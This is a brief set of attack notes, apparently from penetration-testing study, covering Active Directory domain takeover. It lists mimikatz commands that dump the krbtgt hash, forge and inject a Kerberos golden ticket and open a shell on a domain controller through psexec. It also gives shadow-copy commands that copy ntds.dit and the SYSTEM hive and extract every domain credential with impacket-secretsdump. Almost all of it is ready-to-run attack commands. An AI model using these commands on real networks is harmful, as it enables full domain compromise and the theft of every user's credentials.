### Golden Ticket

krbtgt ntlm hash available on domain controller

lsadump::lsa /patch on dc will give krbtgt hash

kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

psexec \\dc1 cmd.exe

won't work with ip address

### Shadow Copies

vshadow.exe -nw -p  C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

reg.exe save hklm\system c:\system.bak

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL